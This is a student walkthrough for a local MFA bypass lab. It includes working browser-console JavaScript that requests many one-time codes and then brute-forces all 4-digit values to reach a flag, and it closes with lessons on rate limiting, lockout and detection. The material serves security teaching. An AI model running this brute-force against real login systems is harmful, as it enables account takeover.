# 🎓 Student Guide - MFA Bypass Lab

## Welcome to the MFA Bypass Lab!

This guide will help you understand and complete the challenge step by step.

---

## 🎯 Your Mission

You've obtained credentials for a user account, but the application is protected by Multi-Factor Authentication (MFA). Your goal is to bypass this protection and access the dashboard to retrieve the FLAG.

---

## 📚 Background Knowledge

### What is MFA?

Multi-Factor Authentication (MFA) requires users to provide two or more verification factors:
1. **Something you know** (password)
2. **Something you have** (OTP token, phone)
3. **Something you are** (biometrics)

In this lab, after entering the password, you need to provide a One-Time Password (OTP).

### What is a Meet-In-The-Middle Attack?

A Meet-In-The-Middle (MITM) attack on MFA works by:
1. Creating many valid targets (requesting multiple OTPs)
2. Trying many guesses (brute-forcing OTP values)
3. Finding where they "meet" (a guess matches a valid OTP)

**Analogy:** Instead of finding one specific needle in a haystack, you're adding more needles to the haystack while searching, making it much easier to find *any* needle.

---

## 🔍 Understanding the Vulnerability

### The Weak Points

1. **Weak OTP**: Only 4 digits = 10,000 possibilities
2. **No Rate Limiting**: You can try unlimited OTPs
3. **No Resend Throttling**: You can request unlimited new OTPs
4. **Multiple Valid OTPs**: Many OTPs can be valid at the same time
5. **Long Expiration**: 5-minute validity window

### Why This Matters

Normally, with a 4-digit OTP and proper rate limiting (say, 3 attempts), you'd have only a 0.03% chance of success. But with unlimited attempts and multiple valid OTPs, success is almost guaranteed.

---

## 🚀 Step-by-Step Walkthrough

### Phase 1: Initial Access

1. **Access the Lab**
   - Open your browser
   - Go to `http://localhost:5000`
   - You should see the login page

2. **Login**
   - Username: `student`
   - Password: `password123`
   - Click "Login"

3. **Observe the MFA Page**
   - You're now at the MFA verification page
   - It asks for a 4-digit OTP
   - Notice the "Resend OTP" button

### Phase 2: Reconnaissance

4. **Test the System**
   - Try entering a random OTP (e.g., `1234`)
   - Notice there's no lockout or delay
   - Click "Resend OTP" multiple times
   - No throttling! You can request as many as you want

5. **Check Active OTPs (Optional)**
   - Open browser Developer Tools (F12)
   - Go to the Console tab
   - Type: `fetch('/debug/otps').then(r => r.json()).then(d => console.log(d))`
   - You can see how many OTPs are currently valid

### Phase 3: Attack Execution

#### Method A: Browser Console Attack (Recommended for Learning)

6. **Generate Many OTPs**
   
   In the browser console, run:
   ```javascript
   // Request 50 new OTPs
   for(let i = 0; i < 50; i++) {
       fetch('/resend_otp', {method: 'POST'});
   }
   ```

7. **Verify OTP Pool**
   
   Check how many are now valid:
   ```javascript
   fetch('/debug/otps').then(r => r.json()).then(d => console.log('Valid OTPs:', d.count));
   ```

8. **Start Brute-Force**
   
   Run this in the console:
   ```javascript
   async function attack() {
       console.log('Starting brute-force attack...');
       
       for(let i = 0; i < 10000; i++) {
           // Format number as 4-digit string (e.g., 0042)
           let otp = String(i).padStart(4, '0');
           
           // Try this OTP
           let response = await fetch('/verify_otp', {
               method: 'POST',
               headers: {'Content-Type': 'application/x-www-form-urlencoded'},
               body: `otp=${otp}`
           });
           
           let data = await response.json();
           
           if(data.success) {
               console.log(`✅ SUCCESS! Valid OTP found: ${otp}`);
               console.log(`Redirecting to dashboard...`);
               window.location.href = data.redirect;
               return;
           }
           
           // Progress indicator
           if(i % 100 == 0) {
               console.log(`Tried ${i} OTPs so far...`);
           }
       }
       
       console.log('Attack completed. OTP not found in range.');
   }
   
   attack();
   ```

9. **Wait for Success**
   - The script will try OTPs from 0000 to 9999
   - When it finds a valid one, it will automatically redirect you
   - You should see the dashboard with the FLAG!

#### Method B: Python Exploit Script (Advanced)

If you prefer automation:

```bash
# Install requirements
pip install requests

# Run the exploit
python3 exploit.py
```

The script will:
- Login automatically
- Spawn multiple threads generating OTPs
- Spawn multiple threads brute-forcing
- Find a valid OTP
- Display success and the URL to access

### Phase 4: Success!

10. **Retrieve the FLAG**
    - You should now be on the dashboard
    - The FLAG will be displayed prominently
    - Copy the FLAG to confirm successful completion

---

## 🤔 Understanding What Happened

### The Attack Flow

```
1. Login with credentials ✓
2. Reach MFA page
3. Continuously request new OTPs
   → OTP #1 generated (valid for 5 min)
   → OTP #2 generated (valid for 5 min)
   → OTP #3 generated (valid for 5 min)
   → ... and so on
4. Simultaneously try all possible values
   → Try 0000 ❌
   → Try 0001 ❌
   → Try 0002 ❌
   → ...
   → Try 3847 ✅ (matches OTP #17)
5. Access granted!
```

### Why It Worked

- **Multiple Targets**: By requesting many OTPs, you created 50+ valid targets
- **Unlimited Attempts**: No rate limiting meant you could try all 10,000 combinations
- **Probability**: With 50 valid OTPs and 10,000 attempts, you have ~50% chance before trying half the range

---

## 💡 Key Takeaways

### Security Lessons Learned

1. **Rate limiting is critical** - Without it, even strong security can be bypassed
2. **OTP strength matters** - 4 digits is too weak; use 6-8 digits minimum
3. **One OTP at a time** - Old OTPs should be invalidated when new ones are generated
4. **Short expiration** - 30-90 seconds, not 5 minutes
5. **Account lockout** - After multiple failures, lock the account temporarily

### Real-World Implications

This vulnerability has been found in:
- Banking applications
- Corporate VPNs
- E-commerce websites
- Government portals

**Always test your own applications for these issues!**

---

## 🎯 Bonus Challenges

### Challenge 1: Optimize the Attack

Can you modify the attack to:
- Find the OTP faster?
- Use fewer resources?
- Be stealthier?

### Challenge 2: Defensive Coding

How would you fix the vulnerable application?
- Modify `app.py` to add rate limiting
- Implement account lockout
- Add CAPTCHA after failures

### Challenge 3: Detection

Can you add logging to detect this attack in progress?
- Log suspicious patterns
- Alert on rapid OTP requests
- Identify brute-force attempts

---

## 📝 Lab Report Template

Document your findings:

```markdown
# MFA Bypass Lab Report

## Student Information
- Name: [Your Name]
- Date: [Date]

## Attack Summary
- Attack Type: Meet-In-The-Middle
- Time to Complete: [X minutes]
- Method Used: [Browser Console / Python Script / Other]

## Vulnerabilities Found
1. [List vulnerability]
2. [List vulnerability]
3. ...

## Attack Steps
1. [Describe step]
2. [Describe step]
3. ...

## FLAG Retrieved
- FLAG: [Your FLAG here]

## Recommendations
1. [Mitigation suggestion]
2. [Mitigation suggestion]
3. ...

## What I Learned
[Your reflection]
```

---

## ❓ Troubleshooting

### Common Issues

**Issue: OTP brute-force not working**
- Make sure you generated many OTPs first (50+)
- Check if there are active OTPs: `fetch('/debug/otps')...`
- Try requesting more OTPs

**Issue: Script is too slow**
- The attack can take a few minutes
- Be patient - it will find a valid OTP
- You can increase the number of OTP requests

**Issue: Session expired**
- If you wait too long, your session might expire
- Just login again and restart the attack

**Issue: Can't access /debug/otps**
- Make sure you're logged in
- This endpoint requires an active session

---

## 🎓 Further Learning

### Recommended Reading

1. OWASP Authentication Testing Guide
2. NIST Digital Identity Guidelines
3. "The Web Application Hacker's Handbook"

### Practice More

- Try other MFA bypass techniques
- Learn about TOTP and how it's more secure
- Study real-world MFA vulnerabilities (CVEs)

---

## ✅ Completion Checklist

- [ ] Successfully logged in
- [ ] Understood the vulnerability
- [ ] Generated multiple OTPs
- [ ] Executed brute-force attack
- [ ] Retrieved the FLAG
- [ ] Documented findings
- [ ] Understand mitigation strategies

---

**Congratulations on completing the lab!** 🎉

You now understand how critical proper rate limiting is for authentication systems. Use this knowledge to build more secure applications!

---

**Questions or Issues?**

If you encounter any problems or have questions, review the README.md file or the application code.

Happy Hacking! 🚀
